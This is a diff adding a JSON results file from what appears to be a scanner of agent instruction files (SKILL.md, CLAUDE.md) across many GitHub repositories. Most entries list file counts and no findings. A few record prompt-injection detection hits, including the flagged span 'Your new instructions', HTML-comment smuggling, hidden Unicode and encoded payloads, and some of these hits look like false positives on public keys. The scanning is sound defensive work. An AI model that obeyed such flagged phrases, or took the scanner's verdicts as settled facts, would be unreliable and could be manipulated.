+        "test/agent_plugins/fixtures/corpus/mcp-invalid/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/_outside-target/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/skill-invalid-sibling/skills/beta/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/skill-invalid-sibling/skills/mismatched/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/skill-invalid-sibling/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/manifest-missing-name/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/extensions-unimplemented-namespace/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/skill-missing-skill-md/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/skill-symlink-inside-root/_sources/linked/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/manifest-bad-name/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/skill-escapes-root/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/manifest-unsupported-schema/skills/alpha/SKILL.md",
+        "test/agent_plugins/fixtures/corpus/manifest-invalid-json/skills/alpha/SKILL.md",
+        "examples/aidlc-portfolio/skills/aidlc-portfolio/SKILL.md",
+        "examples/skills/python-review-checklist/SKILL.md",
+        "skills/cao-plugin/SKILL.md",
+        "skills/cao-provider/SKILL.md",
+        "skills/cao-session-liveness/SKILL.md",
+        "skills/cao-learning/SKILL.md",
+        "skills/mcp-apps-builder/SKILL.md"
+      ],
+      "scanMs": 4683,
+      "ms": 9236,
+      "findings": []
+    },
+    "Max-Samson/knowme-careerforge-skill": {
+      "repo": "Max-Samson/knowme-careerforge-skill",
+      "sha": "b3c999abd996860d4068636ed45c6c5cc8dabfce",
+      "status": "ok",
+      "filesDownloaded": 194,
+      "filesScanned": 194,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 19,
+        "config": 58,
+        "docs": 37,
+        "unknown": 33,
+        "code": 44,
+        "mcp-config": 1,
+        "manifest": 2
+      },
+      "agentFiles": 4,
+      "agentFileSample": [
+        "AGENT.md",
+        ".mcp.json",
+        "SKILL.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 335,
+      "ms": 766,
+      "findings": []
+    },
+    "maurodesouza/ai-kanban-app-lab": {
+      "repo": "maurodesouza/ai-kanban-app-lab",
+      "sha": "6f1867f215cf86d20099b6dfb1164c79abfb87ce",
+      "status": "ok",
+      "filesDownloaded": 1097,
+      "filesScanned": 1097,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 78,
+        "instruction": 131,
+        "unknown": 337,
+        "manifest": 10,
+        "code": 324,
+        "docs": 217
+      },
+      "agentFiles": 122,
+      "agentFileSample": [
+        "lab-09/.agents/skills/epic-current-documentation/SKILL.md",
+        "lab-09/.agents/skills/reviewer/SKILL.md",
+        "lab-09/.agents/skills/epic-cleanup/SKILL.md",
+        "lab-09/.agents/skills/fragiola-ui/SKILL.md",
+        "lab-09/.agents/skills/command-bus-architecture/SKILL.md",
+        "lab-09/.agents/skills/utils-implementation/SKILL.md",
+        "lab-09/.agents/skills/epic-commit-progressively/SKILL.md",
+        "lab-09/.agents/skills/epic-repository-rules/SKILL.md",
+        "lab-09/.agents/skills/epic-plan-execution/SKILL.md",
+        "lab-09/.agents/skills/tech-lead/SKILL.md",
+        "lab-09/.agents/skills/epic-pull-request/SKILL.md",
+        "lab-09/.agents/skills/epic-worktree/SKILL.md",
+        "lab-09/.agents/skills/test-writer/SKILL.md",
+        "lab-09/.agents/skills/epic-merge/SKILL.md",
+        "lab-09/.agents/skills/epic-read/SKILL.md",
+        "lab-09/.agents/skills/epic-handle-dependent-work/SKILL.md",
+        "lab-09/.agents/skills/clarify-first/SKILL.md",
+        "lab-09/.agents/skills/epic-discover-repository/SKILL.md",
+        "lab-09/.agents/skills/setup-command-system/SKILL.md",
+        "lab-09/.agents/skills/epic-execution/SKILL.md",
+        "lab-09/.agents/skills/tech-lead-publish/SKILL.md",
+        "lab-09/.agents/skills/epic-implementer/SKILL.md",
+        "lab-09/.agents/skills/command-handle-implementation/SKILL.md",
+        "lab-08/.agents/skills/research/SKILL.md",
+        "lab-08/.agents/skills/domain-modeling/SKILL.md"
+      ],
+      "scanMs": 1390,
+      "ms": 2496,
+      "findings": []
+    },
+    "AgriciDaniel/claude-obsidian": {
+      "repo": "AgriciDaniel/claude-obsidian",
+      "sha": "2e545563172f97f02ecaaaab376ceea1246a0583",
+      "status": "ok",
+      "filesDownloaded": 262,
+      "filesScanned": 262,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 86,
+        "instruction": 26,
+        "unknown": 24,
+        "config": 31,
+        "code": 95
+      },
+      "agentFiles": 21,
+      "agentFileSample": [
+        ".cursor/rules/claude-obsidian.mdc",
+        ".windsurf/rules/claude-obsidian.md",
+        "tests/fixtures/contracts/valid/skills/example/SKILL.md",
+        ".github/copilot-instructions.md",
+        "GEMINI.md",
+        "skills/defuddle/SKILL.md",
+        "skills/autoresearch/SKILL.md",
+        "skills/think/SKILL.md",
+        "skills/wiki-ingest/SKILL.md",
+        "skills/wiki-mode/SKILL.md",
+        "skills/obsidian-markdown/SKILL.md",
+        "skills/wiki-lint/SKILL.md",
+        "skills/wiki/SKILL.md",
+        "skills/canvas/SKILL.md",
+        "skills/wiki-retrieve/SKILL.md",
+        "skills/obsidian-bases/SKILL.md",
+        "skills/wiki-cli/SKILL.md",
+        "skills/wiki-fold/SKILL.md",
+        "skills/wiki-query/SKILL.md",
+        "skills/save/SKILL.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 551,
+      "ms": 1101,
+      "findings": []
+    },
+    "sirmalloc/ccstatusline": {
+      "repo": "sirmalloc/ccstatusline",
+      "sha": "0c94df755665ed7794f082863821fd5f428cdf60",
+      "status": "ok",
+      "filesDownloaded": 515,
+      "filesScanned": 515,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 59,
+        "docs": 5,
+        "instruction": 2,
+        "manifest": 1,
+        "config": 10,
+        "code": 438
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "AGENTS.md"
+      ],
+      "scanMs": 647,
+      "ms": 1580,
+      "findings": []
+    },
+    "siteboon/claudecodeui": {
+      "repo": "siteboon/claudecodeui",
+      "sha": "b6959148ec006f258d737e72bb630ff2e5e84672",
+      "status": "ok",
+      "filesDownloaded": 1152,
+      "filesScanned": 1152,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 396,
+        "code": 596,
+        "instruction": 18,
+        "config": 129,
+        "docs": 11,
+        "manifest": 2
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        ".agents/skills/backend-module-standards/SKILL.md",
+        ".agents/skills/frontend-module-standards/SKILL.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 1725,
+      "ms": 3034,
+      "findings": []
+    },
+    "Piebald-AI/claude-code-system-prompts": {
+      "repo": "Piebald-AI/claude-code-system-prompts",
+      "sha": "659d9f4cff186a44099048926a695647c0ba1814",
+      "status": "ok",
+      "filesDownloaded": 1301,
+      "filesScanned": 1301,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 3,
+        "unknown": 2,
+        "docs": 1294,
+        "instruction": 2
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 1441,
+      "ms": 2506,
+      "findings": [
+        {
+          "ruleId": "EX-002",
+          "severity": "high",
+          "source": "signature",
+          "title": "Instructions addressed to AI",
+          "file": "system-prompts/agent-prompt-coordinator-worker-instructions.md",
+          "line": 27,
+          "span": "Your new instructions"
+        },
+        {
+          "ruleId": "EX-004",
+          "severity": "high",
+          "source": "signature",
+          "title": "HTML comment smuggling",
+          "file": "system-prompts/agent-prompt-security-monitor-attached-machine-call-results.md",
+          "line": 1,
+          "span": "<!-- name: \"Agent Prompt: Security monitor attached machine call results\" description: \"Explains how the auto mode se..."
+        },
+        {
+          "ruleId": "EX-004",
+          "severity": "high",
+          "source": "signature",
+          "title": "HTML comment smuggling",
+          "file": "system-prompts/system-reminder-web-fetch-untrusted-content-reporting-guidance.md",
+          "line": 1,
+          "span": "<!-- name: \"System Reminder: Web fetch untrusted content reporting guidance\" description: \"Instructs the agent to sum..."
+        }
+      ]
+    },
+    "nicobailon/visual-explainer": {
+      "repo": "nicobailon/visual-explainer",
+      "sha": "9d5f880b7e8e0a9a80c890b8e1bb6918b68481ad",
+      "status": "ok",
+      "filesDownloaded": 95,
+      "filesScanned": 95,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 21,
+        "docs": 23,
+        "code": 35,
+        "instruction": 11,
+        "config": 4,
+        "manifest": 1
+      },
+      "agentFiles": 7,
+      "agentFileSample": [
+        "plugins/visual-explainer/SKILL.md",
+        "configs/openclaw/AGENTS.md",
+        "configs/copilot/AGENTS.md",
+        "configs/codex/AGENTS.md",
+        "configs/pi/AGENTS.md",
+        "configs/antigravity/AGENTS.md",
+        "configs/opencode/AGENTS.md"
+      ],
+      "scanMs": 392,
+      "ms": 837,
+      "findings": []
+    },
+    "Jeffallan/claude-skills": {
+      "repo": "Jeffallan/claude-skills",
+      "sha": "4b94d98605baf742b751bb82832ace5caf942271",
+      "status": "ok",
+      "filesDownloaded": 621,
+      "filesScanned": 621,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 457,
+        "unknown": 26,
+        "config": 39,
+        "code": 26,
+        "instruction": 72,
+        "manifest": 1
+      },
+      "agentFiles": 71,
+      "agentFileSample": [
+        "skills/nextjs-developer/SKILL.md",
+        "skills/database-optimizer/SKILL.md",
+        "skills/fullstack-guardian/SKILL.md",
+        "skills/spark-engineer/SKILL.md",
+        "skills/fine-tuning-expert/SKILL.md",
+        "skills/wordpress-pro/SKILL.md",
+        "skills/code-documenter/SKILL.md",
+        "skills/microservices-architect/SKILL.md",
+        "skills/kotlin-specialist/SKILL.md",
+        "skills/spec-miner/SKILL.md",
+        "skills/fastapi-expert/SKILL.md",
+        "skills/atlassian-mcp/SKILL.md",
+        "skills/flask-expert/SKILL.md",
+        "skills/golang-pro/SKILL.md",
+        "skills/shopify-expert/SKILL.md",
+        "skills/cli-developer/SKILL.md",
+        "skills/salesforce-developer/SKILL.md",
+        "skills/nuxt-expert/SKILL.md",
+        "skills/dotnet-core-expert/SKILL.md",
+        "skills/prompt-engineer/SKILL.md",
+        "skills/monitoring-expert/SKILL.md",
+        "skills/vue-expert-js/SKILL.md",
+        "skills/swift-expert/SKILL.md",
+        "skills/embedded-systems/SKILL.md",
+        "skills/rust-engineer/SKILL.md"
+      ],
+      "scanMs": 1553,
+      "ms": 2648,
+      "findings": []
+    },
+    "diet103/claude-code-infrastructure-showcase": {
+      "repo": "diet103/claude-code-infrastructure-showcase",
+      "sha": "07f75ce3c301259e857343596e7883b8ce5a9f50",
+      "status": "ok",
+      "filesDownloaded": 133,
+      "filesScanned": 133,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 29,
+        "unknown": 6,
+        "instruction": 56,
+        "mcp-config": 1,
+        "code": 36,
+        "config": 4,
+        "manifest": 1
+      },
+      "agentFiles": 50,
+      "agentFileSample": [
+        ".agents/skills/frontend-dev-guidelines/SKILL.md",
+        ".agents/skills/backend-dev-guidelines/SKILL.md",
+        ".agents/skills/skill-developer/SKILL.md",
+        ".agents/skills/error-tracking/SKILL.md",
+        ".agents/skills/source-command-verify-setup/SKILL.md",
+        ".claude/settings.json",
+        ".claude/agents/web-research-specialist.md",
+        ".claude/agents/frontend-error-fixer.md",
+        ".claude/agents/documentation-architect.md",
+        ".claude/agents/auto-error-resolver.md",
+        ".claude/agents/code-architecture-reviewer.md",
+        ".claude/agents/code-refactor-master.md",
+        ".claude/agents/refactor-planner.md",
+        ".claude/agents/plan-reviewer.md",
+        ".claude/commands/verify-setup.md",
+        ".claude/commands/dev-docs-update.md",
+        ".claude/commands/route-research-for-testing.md",
+        ".claude/commands/dev-docs.md",
+        ".claude/skills/frontend-dev-guidelines/resources/component-patterns.md",
+        ".claude/skills/frontend-dev-guidelines/resources/styling-guide.md",
+        ".claude/skills/frontend-dev-guidelines/resources/performance.md",
+        ".claude/skills/frontend-dev-guidelines/resources/loading-and-error-states.md",
+        ".claude/skills/frontend-dev-guidelines/resources/routing-guide.md",
+        ".claude/skills/frontend-dev-guidelines/resources/file-organization.md",
+        ".claude/skills/frontend-dev-guidelines/resources/data-fetching.md"
+      ],
+      "scanMs": 333,
+      "ms": 1322,
+      "findings": []
+    },
+    "frankbria/ralph-claude-code": {
+      "repo": "frankbria/ralph-claude-code",
+      "sha": "11f9df5becc8093ff2265542107e8e53a42e9970",
+      "status": "ok",
+      "filesDownloaded": 154,
+      "filesScanned": 154,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 36,
+        "docs": 33,
+        "unknown": 68,
+        "instruction": 7,
+        "config": 9,
+        "manifest": 1
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        "templates/AGENT.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 368,
+      "ms": 813,
+      "findings": []
+    },
+    "revfactory/harness": {
+      "repo": "revfactory/harness",
+      "sha": "92d9f1b29e7af81acebf51a9fcd1832e739a1414",
+      "status": "ok",
+      "filesDownloaded": 26,
+      "filesScanned": 26,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 2,
+        "docs": 14,
+        "instruction": 4,
+        "config": 6
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        "skills/evolve/SKILL.md",
+        "skills/harness/SKILL.md"
+      ],
+      "scanMs": 79,
+      "ms": 1128,
+      "findings": []
+    },
+    "smtg-ai/claude-squad": {
+      "repo": "smtg-ai/claude-squad",
+      "sha": "070eb9387cda2be2e64aa1a32ee81be160c457a1",
+      "status": "ok",
+      "filesDownloaded": 84,
+      "filesScanned": 84,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 64,
+        "code": 6,
+        "docs": 3,
+        "config": 8,
+        "instruction": 2,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 253,
+      "ms": 694,
+      "findings": []
+    },
+    "automazeio/ccpm": {
+      "repo": "automazeio/ccpm",
+      "sha": "0bcfabb516913b6d484f20a8c9e449fae8e0c0ee",
+      "status": "ok",
+      "filesDownloaded": 30,
+      "filesScanned": 30,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 1,
+        "unknown": 3,
+        "docs": 8,
+        "code": 16,
+        "instruction": 2
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "skill/ccpm/SKILL.md"
+      ],
+      "scanMs": 64,
+      "ms": 377,
+      "findings": []
+    },
+    "getagentseal/codeburn": {
+      "repo": "getagentseal/codeburn",
+      "sha": "c08d761087afe8aaf132777f58326a6e7fecc7ef",
+      "status": "ok",
+      "filesDownloaded": 1584,
+      "filesScanned": 1583,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 88,
+        "unknown": 557,
+        "code": 854,
+        "config": 65,
+        "instruction": 14,
+        "manifest": 5
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "plugins/codeburn/skills/cost/SKILL.md"
+      ],
+      "scanMs": 2817,
+      "ms": 6460,
+      "findings": [
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "docs/design/codeburn-desktop.md",
+          "line": 96,
+          "span": "\\u200B"
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "windows/src-tauri/tauri.conf.json",
+          "line": 71,
+          "span": "dW50cnVzdGVkIGNvbW1lbnQ6IG1pbmlzaWduIHB1YmxpYyBrZXk6IEUwRDUxOTVEMzE0QjM2MEIKUldRTE5rc3hYUm5WNEhVZFpEbEZZR0k2bGtrWDdTZ..."
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "src/plugins/keys.ts",
+          "line": 5,
+          "span": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUNvd0JRWURLMlZ3QXlFQTU1QTAvMUpLTlBoMGFsL2xMN2xhWFBobWVnZVhzUENqK3RoM1B4LzNWM0U9C..."
+        }
+      ]
+    },
+    "anthropics/claude-code-security-review": {
+      "repo": "anthropics/claude-code-security-review",
+      "sha": "0c6a49f1fa56a1d472575da86a94dbc1edb78eda",
+      "status": "ok",
+      "filesDownloaded": 42,
+      "filesScanned": 42,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "code": 27,
+        "instruction": 3,
+        "docs": 5,
+        "manifest": 1,
+        "config": 3
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        ".claude/commands/security-review.md"
+      ],
+      "scanMs": 164,
+      "ms": 435,
+      "findings": []
+    },
+    "Oldcircle/geo-sleuth": {
+      "repo": "Oldcircle/geo-sleuth",
+      "sha": "c27d5ee24ec4393633c5c3d5a3bbe0cebbe33d93",
+      "status": "ok",
+      "filesDownloaded": 141,
+      "filesScanned": 141,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 2,
+        "config": 57,
+        "instruction": 11,
+        "docs": 31,
+        "code": 40
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "skills/geo-sleuth/SKILL.md"
+      ],
+      "scanMs": 480,
+      "ms": 2375,
+      "findings": []
+    },
+    "Haleclipse/CCometixLine": {
+      "repo": "Haleclipse/CCometixLine",
+      "sha": "1749ff85b52d8d10e67e0a04d247ceab768f380f",
+      "status": "ok",
+      "filesDownloaded": 120,
+      "filesScanned": 120,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 3,
+        "config": 8,
+        "docs": 2,
+        "unknown": 93,
+        "code": 6,
+        "manifest": 8
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 238,
+      "ms": 633,
+      "findings": []
+    },
+    "ldayton/Dippy": {
+      "repo": "ldayton/Dippy",
+      "sha": "2edad4a48d616a191c83417552ddc60eb79b526a",
+      "status": "ok",
+      "filesDownloaded": 235,
+      "filesScanned": 235,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 203,
+        "unknown": 10,
+        "config": 6,
+        "instruction": 9,
+        "manifest": 1,
+        "docs": 6
+      },
+      "agentFiles": 7,
+      "agentFileSample": [
+        ".claude/skills/check-coverage/SKILL.md",
+        ".claude/skills/release/SKILL.md",
+        ".claude/skills/verify-counts/SKILL.md",
+        ".claude/skills/add-command/patterns.md",
+        ".claude/skills/add-command/SKILL.md",
+        ".claude/skills/debug/SKILL.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 325,
+      "ms": 746,
+      "findings": []
+    },
+    "shengyanlin/claude-overlay": {
+      "repo": "shengyanlin/claude-overlay",
+      "sha": "e964bf7858bc49655119cbf6afd30550a2b73f1f",
+      "status": "ok",
+      "filesDownloaded": 118,
+      "filesScanned": 118,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 18,
+        "code": 78,
+        "docs": 17,
+        "instruction": 2,
+        "config": 3
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 287,
+      "ms": 954,
+      "findings": []
+    },
+    "serpro69/capy": {
+      "repo": "serpro69/capy",
+      "sha": "e51a8ed1d75f14e94d5ea2361f2c938f3125c6cb",
+      "status": "ok",
+      "filesDownloaded": 1122,
+      "filesScanned": 1122,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 350,
+        "config": 79,
+        "unknown": 669,
+        "code": 16,
+        "mcp-config": 3,
+        "instruction": 5
+      },
+      "agentFiles": 7,
+      "agentFileSample": [
+        ".mcp.json",
+        ".claude/settings.json",
+        ".claude/settings.local.json",
+        ".claude/toolbox/CLAUDE.md",
+        ".capy/AGENTS.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 1871,
+      "ms": 3150,
+      "findings": []
+    },
+    "vimalk78/dictate": {
+      "repo": "vimalk78/dictate",
+      "sha": "0a44d889830effac5eb77a95949bdd8f55657158",
+      "status": "ok",
+      "filesDownloaded": 33,
+      "filesScanned": 33,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 16,
+        "docs": 7,
+        "code": 8,
+        "instruction": 2
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 66,
+      "ms": 637,
+      "findings": []
+    },
+    "Li-Evan/BloomTutor": {
+      "repo": "Li-Evan/BloomTutor",
+      "sha": "1c4be1491b54c17f705706b54a09848f545c7878",
+      "status": "ok",
+      "filesDownloaded": 566,
+      "filesScanned": 566,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 14,
+        "code": 335,
+        "config": 22,
+        "unknown": 157,
+        "manifest": 3,
+        "docs": 35
+      },
+      "agentFiles": 7,
+      "agentFileSample": [
+        "skills/learn-crossover/SKILL.md",
+        "skills/learn-graph/SKILL.md",
+        "skills/learn-feynman/SKILL.md",
+        "skills/learn-deep/SKILL.md",
+        "skills/learn-occam/SKILL.md",
+        "skills/bloom-tutor/SKILL.md",
+        "skills/learn-prototype/SKILL.md"
+      ],
+      "scanMs": 874,
+      "ms": 1724,
+      "findings": []
+    },
+    "zakariagharzouli/sparda": {
+      "repo": "zakariagharzouli/sparda",
+      "sha": "439617e44c22c6bd625a507e19c3deb1f75dbb92",
+      "status": "ok",
+      "filesDownloaded": 1247,
+      "filesScanned": 1246,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 43,
+        "docs": 32,
+        "code": 968,
+        "config": 66,
+        "instruction": 7,
+        "manifest": 130
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "SKILL.md"
+      ],
+      "scanMs": 1442,
+      "ms": 3136,
+      "findings": []
+    },
+    "snwfdhmp/awesome-ralph": {
+      "repo": "snwfdhmp/awesome-ralph",
+      "sha": "086b7bb57cf61155fe6017c6df35489318547700",
+      "status": "ok",
+      "filesDownloaded": 4,
+      "filesScanned": 4,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 1,
+        "instruction": 1,
+        "docs": 1,
+        "config": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 27,
+      "ms": 399,
+      "findings": []
+    },
+    "mvschwarz/openrig": {
+      "repo": "mvschwarz/openrig",
+      "sha": "5833cb296fa38ac8369380363f197e0ee5ef9320",
+      "status": "ok",
+      "filesDownloaded": 5082,
+      "filesScanned": 5082,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 301,
+        "code": 3887,
+        "docs": 372,
+        "instruction": 126,
+        "unknown": 390,
+        "manifest": 6
+      },
+      "agentFiles": 98,
+      "agentFileSample": [
+        "plugins/claude-directory/skills/working-with-an-openrig-team/SKILL.md",
+        ".agents/skills/developing-openrig/SKILL.md",
+        ".claude/skills/developing-openrig/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/pm/requirements-writer/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/pm/backlog-capture/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/pm/context-builder/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/pm/office-hours/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/pm/ui-mockup/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/pm/plan-review/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/pm/exec-summary/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/human-in-the-loop/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/openrig-architect/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/rig-bundles-and-shareable-artifacts/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/openrig-herdr/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/rig-lifecycle/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/openrig-skills/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/agent-starters/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/topology-mutation-and-seat-management/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/specification-system/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/openrig-upgrade/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/watchdog/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/agent-startup-and-context-ingestion/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/working-with-an-openrig-team/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/openrig-cmux/SKILL.md",
+        "packages/daemon/specs/agents/shared/skills/core/cross-host-rig-commands/SKILL.md"
+      ],
+      "scanMs": 8482,
+      "ms": 21545,
+      "findings": []
+    },
+    "educlopez/ui-craft": {
+      "repo": "educlopez/ui-craft",
+      "sha": "c1e556ed843b5aad057678f9a152fbcf756eb62c",
+      "status": "ok",
+      "filesDownloaded": 1131,
+      "filesScanned": 1131,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 231,
+        "config": 43,
+        "code": 95,
+        "instruction": 259,
+        "docs": 496,
+        "manifest": 6,
+        "mcp-config": 1
+      },
+      "agentFiles": 248,
+      "agentFileSample": [
+        ".cursor/skills/friction-log/SKILL.md",
+        ".gemini/skills/animate/SKILL.md",
+        ".gemini/skills/quieter/SKILL.md",
+        ".gemini/skills/shape/SKILL.md",
+        ".gemini/skills/craft/SKILL.md",
+        ".gemini/skills/adapt/SKILL.md",
+        ".gemini/skills/unhappy/SKILL.md",
+        ".gemini/skills/sddesign/SKILL.md",
+        ".gemini/skills/clarify/SKILL.md",
+        ".gemini/skills/heuristic/SKILL.md",
+        ".gemini/skills/start/SKILL.md",
+        ".gemini/skills/distill/SKILL.md",
+        ".gemini/skills/delight/SKILL.md",
+        ".gemini/skills/redesign/SKILL.md",
+        ".gemini/skills/audit/SKILL.md",
+        ".gemini/skills/harden/SKILL.md",
+        ".gemini/skills/ui-craft/SKILL.md",
+        ".gemini/skills/polish/SKILL.md",
+        ".gemini/skills/brief/SKILL.md",
+        ".gemini/skills/extract/SKILL.md",
+        ".gemini/skills/bolder/SKILL.md",
+        ".gemini/skills/typeset/SKILL.md",
+        ".gemini/skills/finalize/SKILL.md",
+        ".gemini/skills/critique/SKILL.md",
+        ".gemini/skills/remember/SKILL.md"
+      ],
+      "scanMs": 2244,
+      "ms": 12160,
+      "findings": []
+    },
+    "OneRedOak/claude-code-workflows": {
+      "repo": "OneRedOak/claude-code-workflows",
+      "sha": "29a34c725313c7621f426f838ed31cf482473fb4",
+      "status": "ok",
+      "filesDownloaded": 20,
+      "filesScanned": 20,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 1,
+        "docs": 10,
+        "config": 3,
+        "instruction": 6
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 42,
+      "ms": 1018,
+      "findings": []
+    },
+    "patakuti/cc-semaphore": {
+      "repo": "patakuti/cc-semaphore",
+      "sha": "aaaf8d4818828c4dec7c3f90fc7feea9b4135e83",
+      "status": "ok",
+      "filesDownloaded": 57,
+      "filesScanned": 57,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 36,
+        "config": 15,
+        "code": 4,
+        "docs": 1,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 96,
+      "ms": 425,
+      "findings": []
+    },
+    "mennanov/blockwatch": {
+      "repo": "mennanov/blockwatch",
+      "sha": "f76eacbaef7051cdd17a94233329c5e39145dbbe",
+      "status": "ok",
+      "filesDownloaded": 382,
+      "filesScanned": 382,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 48,
+        "unknown": 235,
+        "docs": 31,
+        "code": 56,
+        "manifest": 6,
+        "instruction": 6
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".agents/skills/blockwatch/SKILL.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 511,
+      "ms": 1091,
+      "findings": []
+    },
+    "szymdzum/browser-debugger-cli": {
+      "repo": "szymdzum/browser-debugger-cli",
+      "sha": "7593dd62c0a8518e55e18ac39e7e859fff0b5d34",
+      "status": "ok",
+      "filesDownloaded": 1084,
+      "filesScanned": 1084,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 12,
+        "config": 11,
+        "docs": 23,
+        "code": 1015,
+        "instruction": 22,
+        "manifest": 1
+      },
+      "agentFiles": 16,
+      "agentFileSample": [
+        ".claude/skills/bdg/SKILL.md",
+        ".claude/skills/ship/log.md",
+        ".claude/skills/ship/briefs.md",
+        ".claude/skills/ship/scenarios.md",
+        ".claude/skills/ship/cloud/render.mjs",
+        ".claude/skills/ship/cloud/agents/smoke.md",
+        ".claude/skills/ship/cloud/agents/r5-cli.md",
+        ".claude/skills/ship/cloud/agents/r1-nav.md",
+        ".claude/skills/ship/cloud/agents/r4-network.md",
+        ".claude/skills/ship/cloud/agents/r2-verdicts.md",
+        ".claude/skills/ship/cloud/agents/r3-forms.md",
+        ".claude/skills/ship/cloud/routine-template.md",
+        ".claude/skills/ship/scripts/ship.mjs",
+        ".claude/skills/ship/scripts/ship.test.mjs",
+        ".claude/skills/ship/SKILL.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 1367,
+      "ms": 2637,
+      "findings": []
+    },
+    "Piebald-AI/tweakcc": {
+      "repo": "Piebald-AI/tweakcc",
+      "sha": "b026fb55b2e85c9cfd92030e4175227030314152",
+      "status": "ok",
+      "filesDownloaded": 386,
+      "filesScanned": 386,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 33,
+        "config": 167,
+        "code": 179,
+        "manifest": 2,
+        "docs": 2,
+        "instruction": 3
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".claude/skills/patch-creation/SKILL.md",
